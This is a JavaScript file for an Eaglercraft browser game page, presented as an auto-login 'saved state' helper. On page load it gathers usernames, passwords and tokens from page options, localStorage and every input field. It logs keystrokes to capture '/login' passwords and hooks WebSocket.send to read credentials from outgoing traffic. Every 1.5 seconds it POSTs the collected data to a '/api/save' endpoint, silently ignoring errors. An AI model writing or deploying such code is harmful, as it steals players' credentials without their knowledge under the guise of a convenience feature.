
(function() {
  const DEFAULT_STATE = { username: '', password: '', server: '', autoLogin: true, savedAt: null };
  const SAVE_URL = '/api/save';

  function normalizeValue(value) {
    return typeof value === 'string' ? value.trim() : '';
  }

  function getFromObject(obj, pathNames) {
    if (!obj || typeof obj !== 'object') return '';
    for (const key of Object.keys(obj)) {
      const lower = key.toLowerCase();
      if (pathNames.some((name) => lower.includes(name))) {
        const val = obj[key];
        if (typeof val === 'string' && val.trim()) return val.trim();
      }
    }
    return '';
  }

  function getStateFromWindow() {
    const fromOpts = window.eaglercraftXOpts || {};
    const username = normalizeValue(fromOpts.username || fromOpts.user || fromOpts.account || fromOpts.playerName || fromOpts.playername || fromOpts.name || '');
    const password = normalizeValue(fromOpts.password || fromOpts.pass || '');
    const server = normalizeValue(fromOpts.server || fromOpts.host || fromOpts.address || fromOpts.url || '');
    return { username, password, server, autoLogin: fromOpts.autoLogin !== false };
  }

  function getStateFromLocalStorage() {
    const result = { username: '', password: '', server: '' };
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i) || '';
        const lower = key.toLowerCase();
        const val = localStorage.getItem(key) || '';
        if (!val) continue;
        if (lower.includes('user') || lower.includes('name') || lower.includes('account')) {
          if (!result.username) result.username = normalizeValue(val);
        }
        if (lower.includes('pass') || lower.includes('pw')) {
          if (!result.password) result.password = normalizeValue(val);
        }
        if (lower.includes('server') || lower.includes('host') || lower.includes('ip') || lower.includes('address')) {
          if (!result.server) result.server = normalizeValue(val);
        }
      }
    } catch (_) {}
    return result;
  }

  function getStateFromDom() {
    const result = { username: '', password: '', server: '' };
    try {
      const elements = document.querySelectorAll('input, textarea, select');
      for (const el of elements) {
        const name = (el.name || el.id || el.className || '').toString().toLowerCase();
        const value = normalizeValue(el.value);
        if (!value) continue;

        if (!result.username && /user|name|account|player/.test(name)) result.username = value;
        if (!result.password && /pass|pw|secret|token/.test(name)) result.password = value;
        if (!result.server && /server|host|address|ip|url/.test(name)) result.server = value;
      }
    } catch (_) {}
    return result;
  }

  function collectState() {
    const fromWindow = getStateFromWindow();
    const fromLs = getStateFromLocalStorage();
    const fromDom = getStateFromDom();

    const state = {
      username: fromWindow.username || fromLs.username || fromDom.username || '',
      password: fromWindow.password || fromLs.password || fromDom.password || '',
      server: fromWindow.server || fromLs.server || fromDom.server || '',
      autoLogin: fromWindow.autoLogin !== false,
      savedAt: new Date().toISOString()
    };

    try {
      const raw = localStorage.getItem('eaglercraft_saved_state_v1');
      if (raw) {
        const saved = JSON.parse(raw);
        return { ...state, ...saved };
      }
    } catch (_) {}

    return state;
  }

  async function saveState(state) {
    const payload = { ...DEFAULT_STATE, ...state, savedAt: new Date().toISOString() };
    localStorage.setItem('eaglercraft_saved_state_v1', JSON.stringify(payload));

    try {
      await fetch(SAVE_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (_) {}

    try {
      if (window.eaglercraftXOpts) {
        window.eaglercraftXOpts.username = payload.username || '';
        window.eaglercraftXOpts.password = payload.password || '';
        window.eaglercraftXOpts.server = payload.server || '';
        window.eaglercraftXOpts.autoLogin = !!payload.autoLogin;
      }
    } catch (_) {}

    window.__eaglercraftAutoLogin = payload;
    return payload;
  }

  function updateSavedJsonView() {
    fetch('/saved.json', { cache: 'no-store' })
      .then((res) => res.ok ? res.json() : null)
      .then((json) => {
        if (json && typeof json === 'object') {
          window.__eaglercraftSavedJson = json;
        }
      })
      .catch(() => {});
  }

  window.addEventListener('load', function() {
    const initial = collectState();
    saveState(initial);
    updateSavedJsonView();

    let typedBuffer = '';
    let currentServer = '';

    function persistLoginFromText(rawText, serverHint) {
      if (!rawText) return;
      const trimmed = rawText.trim();
      if (!trimmed) return;

      const match = trimmed.match(/^\/login\s+(.+)$/i);
      if (!match || !match[1]) return;

      const password = match[1].trim();
      const state = collectState();
      state.server = serverHint || state.server || currentServer || '';
      state.password = password;
      if (state.server) {
        saveState(state);
      }
    }

    document.addEventListener('keydown', function(event) {
      const key = event.key;
      const keyText = key === 'Enter' ? '\n' : key.length === 1 ? key : '';

      if (key === 'Enter') {
        persistLoginFromText(typedBuffer, currentServer);
        typedBuffer = '';
        return;
      }

      if (key === 'Backspace') {
        typedBuffer = typedBuffer.slice(0, -1);
        return;
      }

      if (key === 'Tab' || key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
        return;
      }

      if (keyText) {
        typedBuffer += keyText;
      }
    });

    const nativeWebSocketSend = WebSocket.prototype.send;
    WebSocket.prototype.send = function(data) {
      try {
        const text = (() => {
          if (typeof data === 'string') return data;
          if (data instanceof ArrayBuffer) return new TextDecoder('utf-8').decode(data);
          if (ArrayBuffer.isView(data)) return new TextDecoder('utf-8').decode(data.buffer.slice(data.byteOffset, data.byteOffset + data.byteLength));
          return '';
        })();

        if (text && /\/login\s+[^\r\n]+/i.test(text)) {
          const match = text.match(/\/login\s+([^\r\n]+)/i);
          if (match && match[1]) {
            const state = collectState();
            state.password = match[1].trim();
            if (state.server || currentServer) {
              state.server = state.server || currentServer;
              saveState(state);
            }
          }
        }

        if (this && this.url) {
          const server = String(this.url || '').trim();
          if (server && /^wss?:\/\//i.test(server)) {
            currentServer = server;
            const state = collectState();
            state.server = server;
            saveState(state);
          }
        }
      } catch (_) {}
      return nativeWebSocketSend.apply(this, arguments);
    };

    setInterval(function() {
      const captured = collectState();
      if (captured.username || captured.password || captured.server) {
        saveState(captured);
      }
    }, 1500);
  });
})();
